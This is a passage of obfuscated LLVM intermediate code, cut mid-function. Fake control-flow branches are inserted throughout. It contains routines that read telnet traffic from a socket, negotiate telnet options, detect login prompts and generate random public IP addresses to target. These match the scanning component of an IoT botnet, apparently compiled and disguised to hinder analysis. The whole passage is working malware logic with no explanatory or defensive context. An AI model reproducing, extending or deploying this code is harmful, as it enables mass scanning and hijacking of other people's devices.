  %16 = icmp ult i64 %13, %15
  br i1 %16, label %17, label %180

; <label>:17:                                     ; preds = %11
  br label %18

; <label>:18:                                     ; preds = %122, %17
  %19 = load i32, i32* %5, align 4
  %20 = load i32, i32* %7, align 4
  %21 = icmp sgt i32 %19, %20
  br i1 %21, label %22, label %120

; <label>:22:                                     ; preds = %18
  %23 = load i8*, i8** %3, align 8
  %24 = load i32, i32* %5, align 4
  %25 = sext i32 %24 to i64
  %26 = getelementptr inbounds i8, i8* %23, i64 %25
  %27 = load i32, i32* %7, align 4
  %28 = sext i32 %27 to i64
  %29 = sub i64 0, %28
  %30 = getelementptr inbounds i8, i8* %26, i64 %29
  %31 = load i8, i8* %30, align 1
  %32 = sext i8 %31 to i32
  %33 = icmp eq i32 %32, 0
  br i1 %33, label %118, label %34

; <label>:34:                                     ; preds = %22
  %35 = load i32, i32* @x.61
  %36 = load i32, i32* @y.62
  %37 = sub i32 %35, 1
  %38 = mul i32 %35, %37
  %39 = urem i32 %38, 2
  %40 = icmp eq i32 %39, 0
  %41 = icmp slt i32 %36, 10
  %42 = or i1 %40, %41
  br i1 %42, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %34
  %43 = load i8*, i8** %3, align 8
  %44 = load i32, i32* %5, align 4
  %45 = sext i32 %44 to i64
  %46 = getelementptr inbounds i8, i8* %43, i64 %45
  %47 = load i32, i32* %7, align 4
  %48 = sext i32 %47 to i64
  %49 = sub i64 0, %48
  %50 = getelementptr inbounds i8, i8* %46, i64 %49
  %51 = load i8, i8* %50, align 1
  %52 = sext i8 %51 to i32
  %53 = icmp eq i32 %52, 32
  %54 = load i32, i32* @x.61
  %55 = load i32, i32* @y.62
  %56 = sub i32 %54, 1
  %57 = mul i32 %54, %56
  %58 = urem i32 %57, 2
  %59 = icmp eq i32 %58, 0
  %60 = icmp slt i32 %55, 10
  %61 = or i1 %59, %60
  br i1 %61, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %53, label %118, label %62

; <label>:62:                                     ; preds = %originalBBpart2
  %63 = load i32, i32* @x.61
  %64 = load i32, i32* @y.62
  %65 = sub i32 %63, 1
  %66 = mul i32 %63, %65
  %67 = urem i32 %66, 2
  %68 = icmp eq i32 %67, 0
  %69 = icmp slt i32 %64, 10
  %70 = or i1 %68, %69
  br i1 %70, label %originalBB4, label %originalBB4alteredBB

originalBB4:                                      ; preds = %originalBB4alteredBB, %62
  %71 = load i8*, i8** %3, align 8
  %72 = load i32, i32* %5, align 4
  %73 = sext i32 %72 to i64
  %74 = getelementptr inbounds i8, i8* %71, i64 %73
  %75 = load i32, i32* %7, align 4
  %76 = sext i32 %75 to i64
  %77 = sub i64 0, %76
  %78 = getelementptr inbounds i8, i8* %74, i64 %77
  %79 = load i8, i8* %78, align 1
  %80 = sext i8 %79 to i32
  %81 = icmp eq i32 %80, 13
  %82 = load i32, i32* @x.61
  %83 = load i32, i32* @y.62
  %84 = sub i32 %82, 1
  %85 = mul i32 %82, %84
  %86 = urem i32 %85, 2
  %87 = icmp eq i32 %86, 0
  %88 = icmp slt i32 %83, 10
  %89 = or i1 %87, %88
  br i1 %89, label %originalBBpart28, label %originalBB4alteredBB

originalBBpart28:                                 ; preds = %originalBB4
  br i1 %81, label %118, label %90

; <label>:90:                                     ; preds = %originalBBpart28
  %91 = load i32, i32* @x.61
  %92 = load i32, i32* @y.62
  %93 = sub i32 %91, 1
  %94 = mul i32 %91, %93
  %95 = urem i32 %94, 2
  %96 = icmp eq i32 %95, 0
  %97 = icmp slt i32 %92, 10
  %98 = or i1 %96, %97
  br i1 %98, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %90
  %99 = load i8*, i8** %3, align 8
  %100 = load i32, i32* %5, align 4
  %101 = sext i32 %100 to i64
  %102 = getelementptr inbounds i8, i8* %99, i64 %101
  %103 = load i32, i32* %7, align 4
  %104 = sext i32 %103 to i64
  %105 = sub i64 0, %104
  %106 = getelementptr inbounds i8, i8* %102, i64 %105
  %107 = load i8, i8* %106, align 1
  %108 = sext i8 %107 to i32
  %109 = icmp eq i32 %108, 10
  %110 = load i32, i32* @x.61
  %111 = load i32, i32* @y.62
  %112 = sub i32 %110, 1
  %113 = mul i32 %110, %112
  %114 = urem i32 %113, 2
  %115 = icmp eq i32 %114, 0
  %116 = icmp slt i32 %111, 10
  %117 = or i1 %115, %116
  br i1 %117, label %originalBBpart219, label %originalBB10alteredBB

originalBBpart219:                                ; preds = %originalBB10
  br label %118

; <label>:118:                                    ; preds = %originalBBpart219, %originalBBpart28, %originalBBpart2, %22
  %119 = phi i1 [ true, %originalBBpart28 ], [ true, %originalBBpart2 ], [ true, %22 ], [ %109, %originalBBpart219 ]
  br label %120

; <label>:120:                                    ; preds = %118, %18
  %121 = phi i1 [ false, %18 ], [ %119, %118 ]
  br i1 %121, label %122, label %125

; <label>:122:                                    ; preds = %120
  %123 = load i32, i32* %7, align 4
  %124 = add nsw i32 %123, 1
  store i32 %124, i32* %7, align 4
  br label %18

; <label>:125:                                    ; preds = %120
  %126 = load i32, i32* @x.61
  %127 = load i32, i32* @y.62
  %128 = sub i32 %126, 1
  %129 = mul i32 %126, %128
  %130 = urem i32 %129, 2
  %131 = icmp eq i32 %130, 0
  %132 = icmp slt i32 %127, 10
  %133 = or i1 %131, %132
  br i1 %133, label %originalBB21, label %originalBB21alteredBB

originalBB21:                                     ; preds = %originalBB21alteredBB, %125
  %134 = load i8*, i8** %3, align 8
  %135 = load i32, i32* %5, align 4
  %136 = sext i32 %135 to i64
  %137 = getelementptr inbounds i8, i8* %134, i64 %136
  %138 = load i32, i32* %7, align 4
  %139 = sext i32 %138 to i64
  %140 = sub i64 0, %139
  %141 = getelementptr inbounds i8, i8* %137, i64 %140
  %142 = load i8, i8* %141, align 1
  %143 = sext i8 %142 to i32
  %144 = load i8*, i8** %4, align 8
  %145 = load i32, i32* %6, align 4
  %146 = sext i32 %145 to i64
  %147 = getelementptr inbounds i8, i8* %144, i64 %146
  %148 = load i8, i8* %147, align 1
  %149 = sext i8 %148 to i32
  %150 = icmp eq i32 %143, %149
  %151 = load i32, i32* @x.61
  %152 = load i32, i32* @y.62
  %153 = sub i32 %151, 1
  %154 = mul i32 %151, %153
  %155 = urem i32 %154, 2
  %156 = icmp eq i32 %155, 0
  %157 = icmp slt i32 %152, 10
  %158 = or i1 %156, %157
  br i1 %158, label %originalBBpart228, label %originalBB21alteredBB

originalBBpart228:                                ; preds = %originalBB21
  br i1 %150, label %159, label %160

; <label>:159:                                    ; preds = %originalBBpart228
  store i32 1, i32* %2, align 4
  br label %181

; <label>:160:                                    ; preds = %originalBBpart228
  %161 = load i32, i32* @x.61
  %162 = load i32, i32* @y.62
  %163 = sub i32 %161, 1
  %164 = mul i32 %161, %163
  %165 = urem i32 %164, 2
  %166 = icmp eq i32 %165, 0
  %167 = icmp slt i32 %162, 10
  %168 = or i1 %166, %167
  br i1 %168, label %originalBB30, label %originalBB30alteredBB

originalBB30:                                     ; preds = %originalBB30alteredBB, %160
  %169 = load i32, i32* @x.61
  %170 = load i32, i32* @y.62
  %171 = sub i32 %169, 1
  %172 = mul i32 %169, %171
  %173 = urem i32 %172, 2
  %174 = icmp eq i32 %173, 0
  %175 = icmp slt i32 %170, 10
  %176 = or i1 %174, %175
  br i1 %176, label %originalBBpart232, label %originalBB30alteredBB

originalBBpart232:                                ; preds = %originalBB30
  br label %177

; <label>:177:                                    ; preds = %originalBBpart232
  %178 = load i32, i32* %6, align 4
  %179 = add nsw i32 %178, 1
  store i32 %179, i32* %6, align 4
  br label %11

; <label>:180:                                    ; preds = %11
  store i32 0, i32* %2, align 4
  br label %181

; <label>:181:                                    ; preds = %180, %159
  %182 = load i32, i32* @x.61
  %183 = load i32, i32* @y.62
  %184 = sub i32 %182, 1
  %185 = mul i32 %182, %184
  %186 = urem i32 %185, 2
  %187 = icmp eq i32 %186, 0
  %188 = icmp slt i32 %183, 10
  %189 = or i1 %187, %188
  br i1 %189, label %originalBB34, label %originalBB34alteredBB

originalBB34:                                     ; preds = %originalBB34alteredBB, %181
  %190 = load i32, i32* %2, align 4
  %191 = load i32, i32* @x.61
  %192 = load i32, i32* @y.62
  %193 = sub i32 %191, 1
  %194 = mul i32 %191, %193
  %195 = urem i32 %194, 2
  %196 = icmp eq i32 %195, 0
  %197 = icmp slt i32 %192, 10
  %198 = or i1 %196, %197
  br i1 %198, label %originalBBpart236, label %originalBB34alteredBB

originalBBpart236:                                ; preds = %originalBB34
  ret i32 %190

originalBBalteredBB:                              ; preds = %originalBB, %34
  %199 = load i8*, i8** %3, align 8
  %200 = load i32, i32* %5, align 4
  %201 = sext i32 %200 to i64
  %202 = getelementptr inbounds i8, i8* %199, i64 %201
  %203 = load i32, i32* %7, align 4
  %204 = sext i32 %203 to i64
  %_ = shl i64 0, %204
  %_1 = sub i64 0, 0
  %gen = add i64 %_1, %204
  %_2 = sub i64 0, 0
  %gen3 = add i64 %_2, %204
  %205 = sub i64 0, %204
  %206 = getelementptr inbounds i8, i8* %202, i64 %205
  %207 = load i8, i8* %206, align 1
  %208 = sext i8 %207 to i32
  %209 = icmp eq i32 %208, 32
  br label %originalBB

originalBB4alteredBB:                             ; preds = %originalBB4, %62
  %210 = load i8*, i8** %3, align 8
  %211 = load i32, i32* %5, align 4
  %212 = sext i32 %211 to i64
  %213 = getelementptr inbounds i8, i8* %210, i64 %212
  %214 = load i32, i32* %7, align 4
  %215 = sext i32 %214 to i64
  %_5 = sub i64 0, 0
  %gen6 = add i64 %_5, %215
  %216 = sub i64 0, %215
  %217 = getelementptr inbounds i8, i8* %213, i64 %216
  %218 = load i8, i8* %217, align 1
  %219 = sext i8 %218 to i32
  %220 = icmp eq i32 %219, 13
  br label %originalBB4

originalBB10alteredBB:                            ; preds = %originalBB10, %90
  %221 = load i8*, i8** %3, align 8
  %222 = load i32, i32* %5, align 4
  %223 = sext i32 %222 to i64
  %224 = getelementptr inbounds i8, i8* %221, i64 %223
  %225 = load i32, i32* %7, align 4
  %226 = sext i32 %225 to i64
  %_11 = sub i64 0, 0
  %gen12 = add i64 %_11, %226
  %_13 = shl i64 0, %226
  %_14 = sub i64 0, 0
  %gen15 = add i64 %_14, %226
  %_16 = sub i64 0, 0
  %gen17 = add i64 %_16, %226
  %227 = sub i64 0, %226
  %228 = getelementptr inbounds i8, i8* %224, i64 %227
  %229 = load i8, i8* %228, align 1
  %230 = sext i8 %229 to i32
  %231 = icmp eq i32 %230, 10
  br label %originalBB10

originalBB21alteredBB:                            ; preds = %originalBB21, %125
  %232 = load i8*, i8** %3, align 8
  %233 = load i32, i32* %5, align 4
  %234 = sext i32 %233 to i64
  %235 = getelementptr inbounds i8, i8* %232, i64 %234
  %236 = load i32, i32* %7, align 4
  %237 = sext i32 %236 to i64
  %_22 = shl i64 0, %237
  %_23 = sub i64 0, %237
  %gen24 = mul i64 %_23, %237
  %_25 = sub i64 0, 0
  %gen26 = add i64 %_25, %237
  %238 = sub i64 0, %237
  %239 = getelementptr inbounds i8, i8* %235, i64 %238
  %240 = load i8, i8* %239, align 1
  %241 = sext i8 %240 to i32
  %242 = load i8*, i8** %4, align 8
  %243 = load i32, i32* %6, align 4
  %244 = sext i32 %243 to i64
  %245 = getelementptr inbounds i8, i8* %242, i64 %244
  %246 = load i8, i8* %245, align 1
  %247 = sext i8 %246 to i32
  %248 = icmp eq i32 %241, %247
  br label %originalBB21

originalBB30alteredBB:                            ; preds = %originalBB30, %160
  br label %originalBB30

originalBB34alteredBB:                            ; preds = %originalBB34, %181
  %249 = load i32, i32* %2, align 4
  br label %originalBB34
}

; Function Attrs: noinline nounwind uwtable
define i32 @readUntil(i32, i8*, i32, i32, i32, i8*, i32, i32) #0 {
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i8*, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca %struct.__sigset_t, align 8
  %22 = alloca %struct.timeval, align 8
  %23 = alloca i8*, align 8
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  store i32 %0, i32* %10, align 4
  store i8* %1, i8** %11, align 8
  store i32 %2, i32* %12, align 4
  store i32 %3, i32* %13, align 4
  store i32 %4, i32* %14, align 4
  store i8* %5, i8** %15, align 8
  store i32 %6, i32* %16, align 4
  store i32 %7, i32* %17, align 4
  %26 = load i32, i32* %17, align 4
  store i32 %26, i32* %18, align 4
  store i32 0, i32* %19, align 4
  store i32 0, i32* %20, align 4
  %27 = load i32, i32* %13, align 4
  %28 = sext i32 %27 to i64
  %29 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 0
  store i64 %28, i64* %29, align 8
  %30 = load i32, i32* %14, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 1
  store i64 %31, i64* %32, align 8
  store i8* null, i8** %23, align 8
  br label %33

; <label>:33:                                     ; preds = %264, %8
  %34 = load i32, i32* @x.63
  %35 = load i32, i32* @y.64
  %36 = sub i32 %34, 1
  %37 = mul i32 %34, %36
  %38 = urem i32 %37, 2
  %39 = icmp eq i32 %38, 0
  %40 = icmp slt i32 %35, 10
  %41 = or i1 %39, %40
  br i1 %41, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %33
  %42 = load i32, i32* %18, align 4
  %43 = add nsw i32 %42, 2
  %44 = load i32, i32* %16, align 4
  %45 = icmp slt i32 %43, %44
  %46 = load i32, i32* @x.63
  %47 = load i32, i32* @y.64
  %48 = sub i32 %46, 1
  %49 = mul i32 %46, %48
  %50 = urem i32 %49, 2
  %51 = icmp eq i32 %50, 0
  %52 = icmp slt i32 %47, 10
  %53 = or i1 %51, %52
  br i1 %53, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %45, label %54, label %80

; <label>:54:                                     ; preds = %originalBBpart2
  %55 = load i32, i32* @x.63
  %56 = load i32, i32* @y.64
  %57 = sub i32 %55, 1
  %58 = mul i32 %55, %57
  %59 = urem i32 %58, 2
  %60 = icmp eq i32 %59, 0
  %61 = icmp slt i32 %56, 10
  %62 = or i1 %60, %61
  br i1 %62, label %originalBB3, label %originalBB3alteredBB

originalBB3:                                      ; preds = %originalBB3alteredBB, %54
  %63 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 0
  %64 = load i64, i64* %63, align 8
  %65 = icmp sgt i64 %64, 0
  %66 = load i32, i32* @x.63
  %67 = load i32, i32* @y.64
  %68 = sub i32 %66, 1
  %69 = mul i32 %66, %68
  %70 = urem i32 %69, 2
  %71 = icmp eq i32 %70, 0
  %72 = icmp slt i32 %67, 10
  %73 = or i1 %71, %72
  br i1 %73, label %originalBBpart25, label %originalBB3alteredBB

originalBBpart25:                                 ; preds = %originalBB3
  br i1 %65, label %78, label %74

; <label>:74:                                     ; preds = %originalBBpart25
  %75 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 1
  %76 = load i64, i64* %75, align 8
  %77 = icmp sgt i64 %76, 0
  br label %78

; <label>:78:                                     ; preds = %74, %originalBBpart25
  %79 = phi i1 [ true, %originalBBpart25 ], [ %77, %74 ]
  br label %80

; <label>:80:                                     ; preds = %78, %originalBBpart2
  %81 = phi i1 [ false, %originalBBpart2 ], [ %79, %78 ]
  br i1 %81, label %82, label %265

; <label>:82:                                     ; preds = %80
  %83 = load i32, i32* @x.63
  %84 = load i32, i32* @y.64
  %85 = sub i32 %83, 1
  %86 = mul i32 %83, %85
  %87 = urem i32 %86, 2
  %88 = icmp eq i32 %87, 0
  %89 = icmp slt i32 %84, 10
  %90 = or i1 %88, %89
  br i1 %90, label %originalBB7, label %originalBB7alteredBB

originalBB7:                                      ; preds = %originalBB7alteredBB, %82
  %91 = load i32, i32* @x.63
  %92 = load i32, i32* @y.64
  %93 = sub i32 %91, 1
  %94 = mul i32 %91, %93
  %95 = urem i32 %94, 2
  %96 = icmp eq i32 %95, 0
  %97 = icmp slt i32 %92, 10
  %98 = or i1 %96, %97
  br i1 %98, label %originalBBpart29, label %originalBB7alteredBB

originalBBpart29:                                 ; preds = %originalBB7
  br label %99

; <label>:99:                                     ; preds = %originalBBpart29
  %100 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %21, i32 0, i32 0
  %101 = getelementptr inbounds [16 x i64], [16 x i64]* %100, i64 0, i64 0
  %102 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %101) #2, !srcloc !5
  %103 = extractvalue { i64, i64* } %102, 0
  %104 = extractvalue { i64, i64* } %102, 1
  %105 = trunc i64 %103 to i32
  store i32 %105, i32* %24, align 4
  %106 = ptrtoint i64* %104 to i64
  %107 = trunc i64 %106 to i32
  store i32 %107, i32* %25, align 4
  br label %108

; <label>:108:                                    ; preds = %99
  %109 = load i32, i32* %10, align 4
  %110 = srem i32 %109, 64
  %111 = zext i32 %110 to i64
  %112 = shl i64 1, %111
  %113 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %21, i32 0, i32 0
  %114 = load i32, i32* %10, align 4
  %115 = sdiv i32 %114, 64
  %116 = sext i32 %115 to i64
  %117 = getelementptr inbounds [16 x i64], [16 x i64]* %113, i64 0, i64 %116
  %118 = load i64, i64* %117, align 8
  %119 = or i64 %118, %112
  store i64 %119, i64* %117, align 8
  %120 = load i32, i32* %10, align 4
  %121 = add nsw i32 %120, 1
  %122 = call i32 @select(i32 %121, %struct.__sigset_t* %21, %struct.__sigset_t* null, %struct.__sigset_t* null, %struct.timeval* %22)
  %123 = icmp slt i32 %122, 1
  br i1 %123, label %124, label %125

; <label>:124:                                    ; preds = %108
  br label %265

; <label>:125:                                    ; preds = %108
  %126 = load i8*, i8** %15, align 8
  %127 = load i32, i32* %18, align 4
  %128 = sext i32 %127 to i64
  %129 = getelementptr inbounds i8, i8* %126, i64 %128
  store i8* %129, i8** %23, align 8
  %130 = load i32, i32* %10, align 4
  %131 = load i8*, i8** %23, align 8
  %132 = call i64 @recv(i32 %130, i8* %131, i64 1, i32 0)
  %133 = trunc i64 %132 to i32
  store i32 %133, i32* %19, align 4
  %134 = load i32, i32* %19, align 4
  %135 = icmp eq i32 %134, -1
  br i1 %135, label %139, label %136

; <label>:136:                                    ; preds = %125
  %137 = load i32, i32* %19, align 4
  %138 = icmp eq i32 %137, 0
  br i1 %138, label %139, label %156

; <label>:139:                                    ; preds = %136, %125
  %140 = load i32, i32* @x.63
  %141 = load i32, i32* @y.64
  %142 = sub i32 %140, 1
  %143 = mul i32 %140, %142
  %144 = urem i32 %143, 2
  %145 = icmp eq i32 %144, 0
  %146 = icmp slt i32 %141, 10
  %147 = or i1 %145, %146
  br i1 %147, label %originalBB11, label %originalBB11alteredBB

originalBB11:                                     ; preds = %originalBB11alteredBB, %139
  store i32 0, i32* %9, align 4
  %148 = load i32, i32* @x.63
  %149 = load i32, i32* @y.64
  %150 = sub i32 %148, 1
  %151 = mul i32 %148, %150
  %152 = urem i32 %151, 2
  %153 = icmp eq i32 %152, 0
  %154 = icmp slt i32 %149, 10
  %155 = or i1 %153, %154
  br i1 %155, label %originalBBpart213, label %originalBB11alteredBB

originalBBpart213:                                ; preds = %originalBB11
  br label %270

; <label>:156:                                    ; preds = %136
  %157 = load i32, i32* @x.63
  %158 = load i32, i32* @y.64
  %159 = sub i32 %157, 1
  %160 = mul i32 %157, %159
  %161 = urem i32 %160, 2
  %162 = icmp eq i32 %161, 0
  %163 = icmp slt i32 %158, 10
  %164 = or i1 %162, %163
  br i1 %164, label %originalBB15, label %originalBB15alteredBB

originalBB15:                                     ; preds = %originalBB15alteredBB, %156
  %165 = load i32, i32* %19, align 4
  %166 = load i32, i32* %18, align 4
  %167 = add nsw i32 %166, %165
  store i32 %167, i32* %18, align 4
  %168 = load i8*, i8** %23, align 8
  %169 = load i8, i8* %168, align 1
  %170 = zext i8 %169 to i32
  %171 = icmp eq i32 %170, 255
  %172 = load i32, i32* @x.63
  %173 = load i32, i32* @y.64
  %174 = sub i32 %172, 1
  %175 = mul i32 %172, %174
  %176 = urem i32 %175, 2
  %177 = icmp eq i32 %176, 0
  %178 = icmp slt i32 %173, 10
  %179 = or i1 %177, %178
  br i1 %179, label %originalBBpart224, label %originalBB15alteredBB

originalBBpart224:                                ; preds = %originalBB15
  br i1 %171, label %180, label %218

; <label>:180:                                    ; preds = %originalBBpart224
  %181 = load i32, i32* %10, align 4
  %182 = load i8*, i8** %23, align 8
  %183 = getelementptr inbounds i8, i8* %182, i64 1
  %184 = call i64 @recv(i32 %181, i8* %183, i64 2, i32 0)
  %185 = trunc i64 %184 to i32
  store i32 %185, i32* %19, align 4
  %186 = load i32, i32* %19, align 4
  %187 = icmp eq i32 %186, -1
  br i1 %187, label %207, label %188

; <label>:188:                                    ; preds = %180
  %189 = load i32, i32* @x.63
  %190 = load i32, i32* @y.64
  %191 = sub i32 %189, 1
  %192 = mul i32 %189, %191
  %193 = urem i32 %192, 2
  %194 = icmp eq i32 %193, 0
  %195 = icmp slt i32 %190, 10
  %196 = or i1 %194, %195
  br i1 %196, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %188
  %197 = load i32, i32* %19, align 4
  %198 = icmp eq i32 %197, 0
  %199 = load i32, i32* @x.63
  %200 = load i32, i32* @y.64
  %201 = sub i32 %199, 1
  %202 = mul i32 %199, %201
  %203 = urem i32 %202, 2
  %204 = icmp eq i32 %203, 0
  %205 = icmp slt i32 %200, 10
  %206 = or i1 %204, %205
  br i1 %206, label %originalBBpart228, label %originalBB26alteredBB

originalBBpart228:                                ; preds = %originalBB26
  br i1 %198, label %207, label %208

; <label>:207:                                    ; preds = %originalBBpart228, %180
  store i32 0, i32* %9, align 4
  br label %270

; <label>:208:                                    ; preds = %originalBBpart228
  %209 = load i32, i32* %19, align 4
  %210 = load i32, i32* %18, align 4
  %211 = add nsw i32 %210, %209
  store i32 %211, i32* %18, align 4
  %212 = load i32, i32* %10, align 4
  %213 = load i8*, i8** %23, align 8
  %214 = call i32 @negotiate(i32 %212, i8* %213, i32 3)
  %215 = icmp ne i32 %214, 0
  br i1 %215, label %217, label %216

; <label>:216:                                    ; preds = %208
  store i32 0, i32* %9, align 4
  br label %270

; <label>:217:                                    ; preds = %208
  br label %264

; <label>:218:                                    ; preds = %originalBBpart224
  %219 = load i8*, i8** %15, align 8
  %220 = load i8*, i8** %11, align 8
  %221 = call i8* @strstr(i8* %219, i8* %220) #10
  %222 = icmp ne i8* %221, null
  br i1 %222, label %230, label %223

; <label>:223:                                    ; preds = %218
  %224 = load i32, i32* %12, align 4
  %225 = icmp ne i32 %224, 0
  br i1 %225, label %226, label %247

; <label>:226:                                    ; preds = %223
  %227 = load i8*, i8** %15, align 8
  %228 = call i32 @matchPrompt(i8* %227)
  %229 = icmp ne i32 %228, 0
  br i1 %229, label %230, label %247

; <label>:230:                                    ; preds = %226, %218
  %231 = load i32, i32* @x.63
  %232 = load i32, i32* @y.64
  %233 = sub i32 %231, 1
  %234 = mul i32 %231, %233
  %235 = urem i32 %234, 2
  %236 = icmp eq i32 %235, 0
  %237 = icmp slt i32 %232, 10
  %238 = or i1 %236, %237
  br i1 %238, label %originalBB30, label %originalBB30alteredBB

originalBB30:                                     ; preds = %originalBB30alteredBB, %230
  store i32 1, i32* %20, align 4
  %239 = load i32, i32* @x.63
  %240 = load i32, i32* @y.64
  %241 = sub i32 %239, 1
  %242 = mul i32 %239, %241
  %243 = urem i32 %242, 2
  %244 = icmp eq i32 %243, 0
  %245 = icmp slt i32 %240, 10
  %246 = or i1 %244, %245
  br i1 %246, label %originalBBpart232, label %originalBB30alteredBB

originalBBpart232:                                ; preds = %originalBB30
  br label %265

; <label>:247:                                    ; preds = %226, %223
  %248 = load i32, i32* @x.63
  %249 = load i32, i32* @y.64
  %250 = sub i32 %248, 1
  %251 = mul i32 %248, %250
  %252 = urem i32 %251, 2
  %253 = icmp eq i32 %252, 0
  %254 = icmp slt i32 %249, 10
  %255 = or i1 %253, %254
  br i1 %255, label %originalBB34, label %originalBB34alteredBB

originalBB34:                                     ; preds = %originalBB34alteredBB, %247
  %256 = load i32, i32* @x.63
  %257 = load i32, i32* @y.64
  %258 = sub i32 %256, 1
  %259 = mul i32 %256, %258
  %260 = urem i32 %259, 2
  %261 = icmp eq i32 %260, 0
  %262 = icmp slt i32 %257, 10
  %263 = or i1 %261, %262
  br i1 %263, label %originalBBpart236, label %originalBB34alteredBB

originalBBpart236:                                ; preds = %originalBB34
  br label %264

; <label>:264:                                    ; preds = %originalBBpart236, %217
  br label %33

; <label>:265:                                    ; preds = %originalBBpart232, %124, %80
  %266 = load i32, i32* %20, align 4
  %267 = icmp ne i32 %266, 0
  br i1 %267, label %268, label %269

; <label>:268:                                    ; preds = %265
  store i32 1, i32* %9, align 4
  br label %270

; <label>:269:                                    ; preds = %265
  store i32 0, i32* %9, align 4
  br label %270

; <label>:270:                                    ; preds = %269, %268, %216, %207, %originalBBpart213
  %271 = load i32, i32* @x.63
  %272 = load i32, i32* @y.64
  %273 = sub i32 %271, 1
  %274 = mul i32 %271, %273
  %275 = urem i32 %274, 2
  %276 = icmp eq i32 %275, 0
  %277 = icmp slt i32 %272, 10
  %278 = or i1 %276, %277
  br i1 %278, label %originalBB38, label %originalBB38alteredBB

originalBB38:                                     ; preds = %originalBB38alteredBB, %270
  %279 = load i32, i32* %9, align 4
  %280 = load i32, i32* @x.63
  %281 = load i32, i32* @y.64
  %282 = sub i32 %280, 1
  %283 = mul i32 %280, %282
  %284 = urem i32 %283, 2
  %285 = icmp eq i32 %284, 0
  %286 = icmp slt i32 %281, 10
  %287 = or i1 %285, %286
  br i1 %287, label %originalBBpart240, label %originalBB38alteredBB

originalBBpart240:                                ; preds = %originalBB38
  ret i32 %279

originalBBalteredBB:                              ; preds = %originalBB, %33
  %288 = load i32, i32* %18, align 4
  %_ = sub i32 %288, 2
  %gen = mul i32 %_, 2
  %_1 = sub i32 0, %288
  %gen2 = add i32 %_1, 2
  %289 = add nsw i32 %288, 2
  %290 = load i32, i32* %16, align 4
  %291 = icmp slt i32 %289, %290
  br label %originalBB

originalBB3alteredBB:                             ; preds = %originalBB3, %54
  %292 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 0
  %293 = load i64, i64* %292, align 8
  %294 = icmp sgt i64 %293, 0
  br label %originalBB3

originalBB7alteredBB:                             ; preds = %originalBB7, %82
  br label %originalBB7

originalBB11alteredBB:                            ; preds = %originalBB11, %139
  store i32 0, i32* %9, align 4
  br label %originalBB11

originalBB15alteredBB:                            ; preds = %originalBB15, %156
  %295 = load i32, i32* %19, align 4
  %296 = load i32, i32* %18, align 4
  %_16 = sub i32 %296, %295
  %gen17 = mul i32 %_16, %295
  %_18 = sub i32 0, %296
  %gen19 = add i32 %_18, %295
  %_20 = sub i32 0, %296
  %gen21 = add i32 %_20, %295
  %_22 = shl i32 %296, %295
  %297 = add nsw i32 %296, %295
  store i32 %297, i32* %18, align 4
  %298 = load i8*, i8** %23, align 8
  %299 = load i8, i8* %298, align 1
  %300 = zext i8 %299 to i32
  %301 = icmp eq i32 %300, 255
  br label %originalBB15

originalBB26alteredBB:                            ; preds = %originalBB26, %188
  %302 = load i32, i32* %19, align 4
  %303 = icmp eq i32 %302, 0
  br label %originalBB26

originalBB30alteredBB:                            ; preds = %originalBB30, %230
  store i32 1, i32* %20, align 4
  br label %originalBB30

originalBB34alteredBB:                            ; preds = %originalBB34, %247
  br label %originalBB34

originalBB38alteredBB:                            ; preds = %originalBB38, %270
  %304 = load i32, i32* %9, align 4
  br label %originalBB38
}

; Function Attrs: nounwind readonly
declare i8* @strstr(i8*, i8*) #1

; Function Attrs: noinline nounwind uwtable
define i32 @GetRandomPublicIP() #0 {
  %1 = alloca [16 x i8], align 16
  %2 = call i32 @rand() #2
  %3 = srem i32 %2, 223
  %4 = trunc i32 %3 to i8
  store i8 %4, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %5 = call i32 @rand() #2
  %6 = srem i32 %5, 255
  %7 = trunc i32 %6 to i8
  store i8 %7, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 1), align 1
  %8 = call i32 @rand() #2
  %9 = srem i32 %8, 255
  %10 = trunc i32 %9 to i8
  store i8 %10, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 2), align 1
  %11 = call i32 @rand() #2
  %12 = srem i32 %11, 255
  %13 = trunc i32 %12 to i8
  store i8 %13, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 3), align 1
  br label %14

; <label>:14:                                     ; preds = %330, %0
  %15 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %16 = zext i8 %15 to i32
  %17 = icmp eq i32 %16, 127
  br i1 %17, label %312, label %18

; <label>:18:                                     ; preds = %14
  %19 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %20 = zext i8 %19 to i32
